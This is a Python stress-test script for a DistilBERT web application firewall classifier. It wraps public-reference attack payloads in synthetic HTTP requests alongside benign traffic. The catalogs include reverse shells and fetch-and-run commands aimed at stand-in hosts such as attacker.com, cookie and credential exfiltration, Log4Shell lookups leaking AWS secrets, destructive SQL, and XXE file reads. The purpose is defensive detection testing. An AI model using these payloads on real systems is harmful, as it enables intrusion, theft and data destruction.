#!/usr/bin/env python3
"""
Large-scale synthetic stress test for the WAF DistilBERT classifier.

This is completely separate from eval_model_v5.py and test_v6_robustness.py:
they were ~200 hand-curated samples each. This script generates ~6000-8000
samples by combining:

    catalog of attack payloads          (~50 per attack class, public refs)
            ×
    injection contexts                  (query / form / JSON / header)
            ×
    benign envelope variants            (host × path × UA)
            +
    realistic normal traffic            (e-commerce / blog / API / static)

For each sample we run the model and aggregate per-class precision / recall /
F1 + confusion matrix + per-context survival rate. Comparison vs an optional
baseline model (v5) is printed side-by-side.

Usage:
    python scripts/test_large_scale.py \
        --model model_v6/final_model_v6 \
        [--baseline ml-service/model_v5/extracted/model/final_model_v5] \
        [--out test_results/large_scale_v6.json] \
        [--samples-per-class 500]
"""
from __future__ import annotations

import argparse
import json
import os
import random
import sys
import time
import urllib.parse
from collections import defaultdict
from typing import Any, Callable, Dict, List, Tuple

import torch
from transformers import AutoTokenizer, AutoModelForSequenceClassification


# --------------------------------------------------------------------------- #
# Canonical compose — mirror Go internal/training/canonical.go                 #
# --------------------------------------------------------------------------- #
HEADER_ORDER = [
    "Host", "User-Agent", "Content-Type", "Referer", "X-Forwarded-For",
    "X-Real-IP", "X-Requested-With", "Origin", "Cookie", "Authorization",
]


def decode_once(s: str) -> str:
    if not s or "%" not in s:
        return s
    try:
        return urllib.parse.unquote(s)
    except Exception:
        return s


def compose(method: str, path: str, headers: Dict[str, str] | None = None, body: str = "") -> str:
    headers = headers or {}
    path = decode_once(path)
    body = decode_once(body)
    lines = [f"{method.upper()} {path}"]
    for h in HEADER_ORDER:
        v = headers.get(h) or headers.get(h.lower())
        if v:
            lines.append(f"{h}: {v}")
    out = "\n".join(lines)
    if body:
        out += "\n\n" + body
    return out


# --------------------------------------------------------------------------- #
# Realistic envelope pool                                                      #
# --------------------------------------------------------------------------- #
HOSTS = [
    "shop.example.com", "blog.example.com", "api.example.com", "app.example.com",
    "news.example.com", "wiki.example.com", "docs.example.com", "cdn.example.com",
    "store.example.org", "forum.example.net", "admin.example.com", "ops.example.com",
    "tools.example.io", "files.example.com", "login.example.com", "api.v2.example.com",
    "internal.corp.local", "service.example.io", "media.example.com", "search.example.com",
]

# Realistic paths that match each "service type" — keep the model from
# learning attack ↔ host correlation.
PATHS_BY_CONTEXT = {
    "query":  ["/products", "/search", "/news", "/items", "/articles", "/p", "/find",
               "/q", "/lookup", "/api/v1/get", "/category", "/tag", "/user", "/profile"],
    "form":   ["/login", "/contact", "/api/submit", "/comment", "/feedback", "/register",
               "/save", "/api/v1/post", "/upload", "/checkout", "/subscribe"],
    "json":   ["/api/v1/data", "/api/login", "/api/users", "/api/search", "/api/v2/query",
               "/api/cmd", "/api/v1/render", "/graphql", "/api/exec", "/api/v2/fetch"],
    "header": ["/", "/health", "/api/v1/probe", "/status", "/index.html", "/api/v1/data"],
    "xml":    ["/api/import", "/svc/parse", "/api/xml", "/parse", "/api/upload.xml",
               "/feed", "/soap", "/api/v1/svg"],
}

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "curl/8.4.0",
    "PostmanRuntime/7.37.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
]

REFERERS = [
    "", "", "",  # 3/8 empty referer
    "https://www.google.com/",
    "https://duckduckgo.com/",
    "https://www.bing.com/search?q=tutorial",
    "https://shop.example.com/category/electronics",
    "https://news.example.com/2026/05/article",
]


def random_envelope(rng: random.Random, context: str = "query") -> dict:
    """Pick a random host/path/UA combo for the given injection context."""
    return {
        "host": rng.choice(HOSTS),
        "path": rng.choice(PATHS_BY_CONTEXT[context]),
        "ua": rng.choice(USER_AGENTS),
        "referer": rng.choice(REFERERS),
    }


# --------------------------------------------------------------------------- #
# Attack payload catalog                                                       #
# --------------------------------------------------------------------------- #
# Each class has 30-80 base payloads drawn from public attack references
# (OWASP cheat sheets, PayloadsAllTheThings-style catalogues, CVE writeups).
# These are deliberately diverse — no two share a common substring of >20 char.

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "admin'--", "admin' #",
    "' UNION SELECT NULL--", "' UNION SELECT username,password FROM users--",
    "1' AND 1=2--", "1' AND 1=1--", "1' OR SLEEP(5)--",
    "1; DROP TABLE users--", "1; DROP TABLE products", "1; DELETE FROM logs",
    "1; UPDATE users SET role='admin' WHERE id=1",
    "1 UNION SELECT NULL,version()", "1 UNION ALL SELECT NULL,user(),database()",
    "1 AND extractvalue(1,concat(0x7e,version()))",
    "1' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1 AND BENCHMARK(5000000,MD5('a'))",
    "1 OR pg_sleep(5)--", "1' AND pg_sleep(5)--",
    "0x31204f522031203d2031", "0x27204f522027313d31",
    "1) OR (1=1", "1) OR ('1'='1",
    "' OR 'a'='a' AND '1'='1",
    "' UNION SELECT load_file('/etc/passwd')--",
    "' UNION SELECT @@version,user(),database()--",
    "1' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,version(),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
    "%27%20OR%20%271%27%3D%271",
    "%27%20UNION%20SELECT%20NULL--",
    "1%27%20AND%20SLEEP(5)--",
    "1;%20DROP%20TABLE%20users",
    # MSSQL / Oracle flavours
    "1; EXEC xp_cmdshell('whoami')--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "1 UNION SELECT banner FROM v$version",
    # PostgreSQL
    "1; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com'--",
    "'; DROP DATABASE postgres;--",
    "1' OR (SELECT 1 FROM pg_sleep(5))--",
    # Comments / inline
    "1/**/OR/**/1=1",
    "1/**/UNION/**/SELECT/**/NULL",
    "1' ;%00SELECT version()--",
    "1' AND IF(1=1,SLEEP(5),0)--",
    # JSON injection
    '{"id":"1\' OR 1=1--"}',
    '{"q":"\' UNION SELECT password FROM users--"}',
    # Stacked with comments
    "1';-- SELECT * FROM users WHERE 1=",
    "1' AND 'x'='x';-- /* end */",
    "1'+UNION+SELECT+null,table_name+FROM+information_schema.tables--",
    "1 ORDER BY 10--",
    "1 GROUP BY columnname HAVING 1=1--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script src=https://evil.com/x.js></script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(/xss/)>",
    "<body onload=alert('xss')>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<a href=javascript:eval(atob('YWxlcnQoMSk='))>x</a>",
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<details/open/ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",  # filter bypass
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert(1)</script>",
    "<img src=\"x\" onerror=\"alert(String.fromCharCode(88,83,83))\">",
    "<svg><script>alert&#40;1&#41;</script></svg>",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "<style>@import 'http://evil.com/x.css'</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<form><button formaction=javascript:alert(1)>x",
    "<keygen autofocus onfocus=alert(1)>",
    "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><img src onerror=alert(1)>",
    "<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    # URL-encoded
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%3Cimg+src%3Dx+onerror%3Dalert(1)%3E",
    "%3Csvg%2Fonload%3Dalert(1)%3E",
    # DOM XSS
    "#<img src=x onerror=alert(1)>",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # Cross-context
    "</script><script>alert(1)</script>",
    "\";alert(1);//",
    "');alert(1);//",
    "{{constructor.constructor('alert(1)')()}}",  # Angular
    "<x onclick=alert(1)>x</x>",
    "<img src=\"\" onerror=\"this.src='http://evil/?c='+document.cookie\">",
]

CMDI_PAYLOADS = [
    ";cat /etc/passwd", ";cat /etc/shadow", ";id", ";whoami", ";uname -a",
    "&& cat /etc/passwd", "&& id", "&& whoami",
    "|cat /etc/passwd", "|id", "|whoami", "|nc evil.com 4444",
    "|nc -e /bin/sh attacker.com 9999", "|curl http://attacker.com/sh.sh|sh",
    "||id", "||cat /etc/passwd",
    "`id`", "`whoami`", "`cat /etc/passwd`", "`uname -a`", "`hostname`",
    "$(id)", "$(whoami)", "$(cat /etc/passwd)", "$(uname -a)",
    "$(curl http://attacker.com/sh|sh)",
    "$(nslookup `whoami`.attacker.com)",
    "$(python -c 'import os;os.system(\"id\")')",
    "$(wget http://attacker.com/sh -O- | bash)",
    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "; sh -i >& /dev/tcp/attacker.com/4444 0>&1",
    "; perl -e 'use Socket;...'", "; python -c 'import socket,subprocess'",
    ";wget http://evil.com/x.elf -O /tmp/x && chmod +x /tmp/x && /tmp/x",
    ";curl -d $(cat /etc/passwd) http://attacker.com",
    # URL-encoded
    "%3Bid", "%3Bcat+%2Fetc%2Fpasswd", "%26%26whoami",
    "%7C%7Cwhoami", "%24%28id%29", "%60id%60",
    "%24%28cat+%2Fetc%2Fpasswd%29",
    # Windows
    "& dir", "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "& whoami", "& net user", "&& powershell -c \"Get-Process\"",
    "& ping -c 1 attacker.com", "&& systeminfo",
    "; powershell -EncodedCommand <base64>",
    # Subshell variants
    "`{cat,/etc/passwd}`", "$({cat,/etc/passwd})",
    # Newline injection
    "\nid\n", "\ncat /etc/passwd\n",
    # ${IFS} bypass
    "cat${IFS}/etc/passwd", "ls${IFS}-la${IFS}/", "id${IFS}",
    # JSON body
    '{"input":"$(id)"}', '{"cmd":";cat /etc/passwd"}',
    '{"x":"`whoami`"}',
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../../../etc/passwd", "../../../etc/shadow", "../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",  # double URL-encoded
    "....//....//....//etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",  # UTF-8 overlong
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\boot.ini",
    "..\\..\\..\\windows\\win.ini",
    "%5C..%5C..%5C..%5Cwindows%5Cwin.ini",  # backslash-encoded
    "../../../proc/self/environ", "../../../proc/self/cmdline",
    "../../../proc/self/maps", "../../../proc/version",
    "../../../../var/log/auth.log", "../../../../var/log/messages",
    "../../../../../../root/.ssh/id_rsa",
    "../../../../home/user/.bash_history",
    "../../../../var/www/html/config.php",
    "/etc/passwd%00.png", "/etc/passwd%00.jpg",  # null-byte
    "....\\....\\....\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/var/www/../../etc/passwd",
    "..\\..\\..\\..\\..\\boot.ini",
    "....//..//..//etc/passwd",
    "....\\....\\....\\boot.ini",
    "/.././../.././etc/passwd",
    "../../../etc/hosts",
    # Hidden via newline
    "../\n../\n../etc/passwd",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/api/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://localhost/", "http://localhost:8080/admin",
    "http://127.0.0.1/", "http://127.0.0.1:6379/", "http://127.0.0.1:22/",
    "http://127.0.0.1:9200/_cluster/health",
    "http://[::1]:6379/", "http://[::]:8080/",
    "http://0.0.0.0/", "http://0177.0.0.1/", "http://2130706433/",  # int IP
    "http://[::ffff:127.0.0.1]/",
    "file:///etc/passwd", "file:///etc/hosts", "file:///proc/version",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_FLUSHALL",
    "gopher://127.0.0.1:25/SMTP%20attack",
    "dict://127.0.0.1:11211/stats",
    "ldap://127.0.0.1:389/dc=admin",
    "sftp://127.0.0.1/", "tftp://127.0.0.1/",
    "ftp://127.0.0.1/",
    # DNS rebinding
    "http://localhost.attacker.com/",
    "http://127.0.0.1.attacker.com/",
    # Cloud metadata variants
    "http://100.100.100.200/latest/meta-data/",  # Alibaba
    "http://169.254.169.254/openstack/latest/meta_data.json",  # OpenStack
    # URL-encoded
    "http%3A%2F%2F127.0.0.1%3A22%2F",
    "http%3A%2F%2F169.254.169.254%2F",
    "file%3A%2F%2F%2Fetc%2Fpasswd",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/x">]><foo>&xxe;</foo>',
    '<!DOCTYPE root [<!ENTITY % p SYSTEM "http://evil.com/x.dtd">%p;]><root/>',
    '<!DOCTYPE r [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY exfil SYSTEM \'http://x.com/?d=%file;\'>">%eval;%exfil;]><r/>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE replace [<!ENTITY ent SYSTEM "expect://id">]><user>&ent;</user>',
    '<!DOCTYPE t [<!ENTITY a SYSTEM "netdoc:/etc/hosts">]><t>&a;</t>',
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
    '<!DOCTYPE r [<!ENTITY % xxe SYSTEM "http://attacker.com/exfil.dtd"> %xxe;]><r/>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a SYSTEM "jar:http://evil.com/x.jar!/file">]><x>&a;</x>',
    '<!DOCTYPE foo SYSTEM "http://evil.com/dtd"><foo/>',
    '<!DOCTYPE r [<!ELEMENT r ANY><!ENTITY ext SYSTEM "http://attacker.com/exfil">]><r>&ext;</r>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % a SYSTEM "data:text/plain,<!ENTITY exfil SYSTEM \'file:///etc/passwd\'>"> %a;]><x>&exfil;</x>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE x [<!ENTITY % remote SYSTEM "http://attacker.com/oob"> %remote;]><x/>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/auth.log">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a SYSTEM "file:///proc/self/environ">]><x>&a;</x>',
    '<!DOCTYPE m [<!ENTITY all SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><m>&all;</m>',
]

LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://attacker.com/a}",
    "${jndi:ldap://evil.com/exploit}",
    "${jndi:rmi://attacker.com/x}",
    "${jndi:dns://attacker.com/test}",
    "${jndi:ldap://${env:USER}.attacker.com/a}",
    "${jndi:ldap://${env:HOSTNAME}.attacker.com/a}",
    "${jndi:ldap://${sys:java.version}.attacker.com/a}",
    "${jndi:ldap://${hostName}.attacker.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://x/a}",
    "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://x/a}",
    "${${env:NaN:-j}ndi:ldap://x.com/a}",
    "${${env:BAR:-j}ndi${env:BAR:-:}${env:BAR:-l}dap://x.com/a}",
    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://x.com/a}",
    "${${:-j}${:-n}${:-d}${:-i}:ldap://x.com/a}",
    "${jndi:ldap://x.attacker.com:1389/Basic/Command/Base64/d2hvYW1p}",
    # URL-encoded
    "%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D",
    "%24%7Bjndi%3Armi%3A%2F%2Fx%2Fa%7D",
    "%24%7Bjndi%3Adns%3A%2F%2Fx%2F%7D",
    # Mixed
    "${j${::-n}di:ldap://x.com/a}",
    "${${::-${::-j}}ndi:ldap://x.com/a}",
    "x=${jndi:ldap://x.com/a}&y=ok",  # embedded in normal-looking string
    "${env:JAVA_HOME}${jndi:ldap://x.com/a}",
    # CVE-2021-44832 style (JDBC)
    "${jndi:ldap://x.com/o=ref}",
    "${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.attacker.com}",
    "${jndi:ldap://${env:AWS_ACCESS_KEY_ID}.attacker.com/a}",
    # No protocol prefix
    "${jndi:",  # truncated — should still raise suspicion
    "${jndi:ldap:",
    "${jndi://x/a}",
]

SSTI_PAYLOADS = [
    "{{7*7}}", "{{7*'7'}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
    "{{config}}", "{{config.items()}}", "{{request.application.__globals__}}",
    "{{request.args.get('x')}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[401](['id'])}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{[].__class__.__base__.__subclasses__()}}",
    "{%import os%}{{os.popen('id').read()}}",
    "{%for c in [].__class__.__base__.__subclasses__()%}{{c}}{%endfor%}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    # Jinja2
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{ self.__init__.__globals__.os.popen('id').read() }}",
    # Twig
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}",
    "{{['id']|filter('system')}}",
    # FreeMarker
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    # Velocity
    "#set($x = $rt.exec('id'))",
    "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
    # Smarty
    "{php}echo `id`;{/php}",
    "{system('id')}",
    # Ruby ERB
    "<%= system('id') %>",
    "<%= `cat /etc/passwd` %>",
    # Mako
    "<% import os; os.system('id') %>",
    # Handlebars
    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require('child_process').exec('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
    # Generic
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "@{ Runtime.getRuntime().exec('id') }",
    # URL-encoded
    "%7B%7B7*7%7D%7D",
    "%7B%7Bconfig.items()%7D%7D",
    "%7B%25+import+os+%25%7D%7B%7B+os.popen('id').read()+%7D%7D",
]

NOSQLI_PAYLOADS = [
    '{"username":{"$ne":null},"password":{"$ne":null}}',
    '{"username":{"$ne":""},"password":{"$ne":""}}',
    '{"user":"admin","pwd":{"$gt":""}}',
    '{"user":{"$regex":"^a"}}',
    '{"username":"admin","password":{"$regex":".*"}}',
    '{"username":{"$exists":true},"password":{"$exists":true}}',
    '{"$where":"function(){return this.password.length>0}"}',
    '{"$where":"this.password == this.username"}',
    '{"$where":"sleep(5000)"}',
    '{"$where":"return true"}',
    '{"filter":{"$where":"sleep(2000)"}}',
    '{"id":{"$ne":-1},"$comment":"bypass"}',
    '{"$or":[{"role":"admin"},{"role":"superuser"}]}',
    '{"$and":[{"role":"admin"},{"active":true}]}',
    '{"filter":{"role":"admin","_id":{"$ne":null}}}',
    '{"user":{"$nin":["guest"]},"role":"admin"}',
    "username[$ne]=null&password[$ne]=null",
    "username[$regex]=^admin",
    "u[$gt]=", "id[$ne]=-1",
    "email[$ne]=null&password[$ne]=null",
    "user[$regex]=.*&pwd[$ne]=",
    '{"_id":"123","payload":{"$where":"return 1==1"}}',
    '{"name":{"$expr":{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}}}',
    # MongoDB operators
    '{"$expr":{"$function":{"body":"return 1==1","args":[],"lang":"js"}}}',
    '{"$jsonSchema":{"required":["password"]}}',
    # Couchbase / others
    '{"sql":"SELECT * FROM users WHERE 1=1"}',
    # Encoded versions
    "%7B%22%24where%22%3A%22sleep(5000)%22%7D",
]

ATTACKS_CATALOG = {
    "sqli":           SQLI_PAYLOADS,
    "xss":            XSS_PAYLOADS,
    "cmdi":           CMDI_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "ssrf":           SSRF_PAYLOADS,
    "xxe":            XXE_PAYLOADS,
    "log4shell":      LOG4SHELL_PAYLOADS,
    "ssti":           SSTI_PAYLOADS,
    "nosqli":         NOSQLI_PAYLOADS,
}


# --------------------------------------------------------------------------- #
# Sample generators                                                            #
# --------------------------------------------------------------------------- #
def gen_query_inject(rng, payload, label) -> dict:
    env = random_envelope(rng, "query")
    qp = rng.choice(["id", "q", "name", "search", "user", "page", "file", "path", "url"])
    return dict(
        method="GET",
        path=f"{env['path']}?{qp}={payload}",
        headers={"Host": env["host"], "User-Agent": env["ua"], "Referer": env["referer"] or None},
        body="",
        gold=label,
        context="query",
    )


def gen_form_inject(rng, payload, label) -> dict:
    env = random_envelope(rng, "form")
    fn = rng.choice(["input", "comment", "msg", "data", "value", "text", "query"])
    body = f"{fn}={urllib.parse.quote(payload, safe='')}"
    return dict(
        method="POST",
        path=env["path"],
        headers={
            "Host": env["host"], "User-Agent": env["ua"],
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body=body,
        gold=label,
        context="form",
    )


def gen_json_inject(rng, payload, label) -> dict:
    env = random_envelope(rng, "json")
    if payload.startswith("{") and payload.endswith("}"):
        body = payload  # the payload itself is the JSON
    else:
        key = rng.choice(["q", "input", "data", "filter", "expr", "cmd", "src", "tpl"])
        # Escape quotes for JSON embedding
        esc = payload.replace("\\", "\\\\").replace('"', '\\"')
        body = json.dumps({key: esc})
    return dict(
        method="POST",
        path=env["path"],
        headers={
            "Host": env["host"], "User-Agent": env["ua"],
            "Content-Type": "application/json",
        },
        body=body,
        gold=label,
        context="json",
    )


def gen_header_inject(rng, payload, label) -> dict:
    """Header injection — works best for log4shell, also possible for XSS / cmdi."""
    env = random_envelope(rng, "header")
    target_header = rng.choice(["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "Origin"])
    headers = {
        "Host": env["host"],
        "User-Agent": env["ua"] if target_header != "User-Agent" else payload,
    }
    if target_header == "Referer":
        headers["Referer"] = payload
    elif target_header == "X-Forwarded-For":
        headers["X-Forwarded-For"] = payload
    elif target_header == "X-Real-IP":
        headers["X-Real-IP"] = payload
    elif target_header == "Origin":
        headers["Origin"] = payload
    return dict(
        method="GET", path=env["path"], headers=headers, body="",
        gold=label, context="header",
    )


def gen_xml_inject(rng, payload, label) -> dict:
    """XML body — exclusive context for XXE."""
    env = random_envelope(rng, "xml")
    return dict(
        method="POST", path=env["path"],
        headers={
            "Host": env["host"], "User-Agent": env["ua"],
            "Content-Type": "application/xml",
        },
        body=payload, gold=label, context="xml",
    )


# Map label → preferred contexts (some attacks fit certain contexts better).
LABEL_CONTEXTS = {
    "sqli":           ["query", "form", "json"],
    "xss":            ["query", "form", "json", "header"],
    "cmdi":           ["query", "form", "json"],
    "path_traversal": ["query", "form", "json"],
    "ssrf":           ["query", "form", "json"],
    "xxe":            ["xml"],
    "log4shell":      ["query", "header", "json", "form"],
    "ssti":           ["query", "form", "json"],
    "nosqli":         ["json", "query", "form"],
}

CTX_GEN = {
    "query":  gen_query_inject,
    "form":   gen_form_inject,
    "json":   gen_json_inject,
    "header": gen_header_inject,
    "xml":    gen_xml_inject,
}


def gen_attacks(rng: random.Random, per_class: int) -> List[dict]:
    """Generate `per_class` attack samples per attack family."""
    out = []
    for label, payloads in ATTACKS_CATALOG.items():
        contexts = LABEL_CONTEXTS[label]
        for i in range(per_class):
            payload = rng.choice(payloads)
            ctx = rng.choice(contexts)
            out.append(CTX_GEN[ctx](rng, payload, label))
    return out


# --------------------------------------------------------------------------- #
# Normal traffic generator                                                     #
# --------------------------------------------------------------------------- #
NORMAL_QUERY_KEYWORDS = [
    # Hard negatives — these "look suspicious" but are legitimate searches.
    "SQL injection tutorial", "how to prevent XSS", "cross-site scripting wiki",
    "bash shell scripting guide", "eval function python", "exec command nodejs",
    "DROP TABLE syntax mysql", "SELECT statement examples", "UPDATE statement",
    "JOIN clause tutorial", "WHERE in SQL", "INSERT INTO syntax",
    "script tag attributes HTML", "iframe sandbox", "javascript void(0)",
    "log4j vulnerability CVE", "spring boot template", "jinja2 inheritance",
    "mongodb regex query", "postgres function", "linux find command",
    "ssh tunnel local port", "curl post json", "docker exec interactive",
    "kubectl exec pod", "git diff staged", "regex lookahead",
    "json schema validation", "yaml multiline", "github actions workflow",
    # Plain product search
    "running shoes size 10", "wireless headphones bluetooth", "laptop stand adjustable",
    "smart watch fitness tracker", "coffee maker programmable",
    "wireless mouse ergonomic", "mechanical keyboard rgb",
    "monitor 4k ips", "gaming chair lumbar support",
    "external hard drive 2tb", "usb-c hub thunderbolt",
    "noise cancelling headphones",
    # General queries
    "weather forecast tomorrow", "news today politics",
    "recipe chicken curry", "movie reviews 2026",
    "best restaurants near me", "flight from HCMC to Hanoi",
    "hotel booking Da Nang",
]

NORMAL_PATHS_STATIC = [
    "/", "/index.html", "/about", "/contact", "/help", "/faq", "/terms", "/privacy",
    "/blog", "/blog/posts", "/articles", "/news", "/products", "/services",
    "/docs", "/docs/getting-started", "/docs/api", "/docs/installation.html",
    "/static/css/main.css", "/static/js/app.bundle.min.js", "/static/img/logo.png",
    "/favicon.ico", "/robots.txt", "/sitemap.xml",
    "/health", "/status", "/api/v1/ping",
    "/wiki/Bash_(Unix_shell)", "/wiki/SQL", "/wiki/Cross-site_scripting",
    "/topic/security", "/category/electronics", "/tag/devops",
    "/articles/2026/05/ai-trends", "/blog/posts?category=security",
]


def gen_normal_search(rng) -> dict:
    """Normal search query — hard-negative for v5 which over-fit `?q=...` ↔ XSS."""
    env = random_envelope(rng, "query")
    kw = rng.choice(NORMAL_QUERY_KEYWORDS)
    qp = rng.choice(["q", "search", "keyword", "term", "query"])
    return dict(
        method="GET",
        path=f"/search?{qp}={urllib.parse.quote_plus(kw)}",
        headers={"Host": env["host"], "User-Agent": env["ua"], "Referer": env["referer"] or None},
        body="", gold="normal", context="search",
    )


def gen_normal_browsing(rng) -> dict:
    env = random_envelope(rng, "query")
    return dict(
        method="GET", path=rng.choice(NORMAL_PATHS_STATIC),
        headers={"Host": env["host"], "User-Agent": env["ua"], "Referer": env["referer"] or None},
        body="", gold="normal", context="browse",
    )


def gen_normal_api(rng) -> dict:
    env = random_envelope(rng, "json")
    op = rng.choice(["read", "list", "get", "search", "lookup", "fetch"])
    body_json = rng.choice([
        '{"page":1,"per_page":20}',
        '{"filter":{"status":"active"},"sort":"created_at"}',
        '{"q":"shoes","category":"footwear"}',
        '{"user_id":4291,"include":["profile","preferences"]}',
        '{"start":"2026-04-01","end":"2026-05-01"}',
        '{"email":"alice@example.com","password":"***REDACTED***"}',
        '{"order_id":"o-8821","cart":[{"sku":"AB1","qty":2}]}',
        '{"comment":"This article was very helpful, thanks!"}',
    ])
    return dict(
        method="POST", path=f"{env['path']}/{op}",
        headers={
            "Host": env["host"], "User-Agent": env["ua"],
            "Content-Type": "application/json",
        },
        body=body_json, gold="normal", context="api",
    )


def gen_normal_form(rng) -> dict:
    env = random_envelope(rng, "form")
    body = rng.choice([
        "name=John+Doe&email=jdoe%40example.com&subject=Question+about+pricing&message=Hi+team",
        "username=alice&password=hunter2&remember=on",
        "title=My+First+Post&content=Hello+world%21+This+is+my+first+blog+post.",
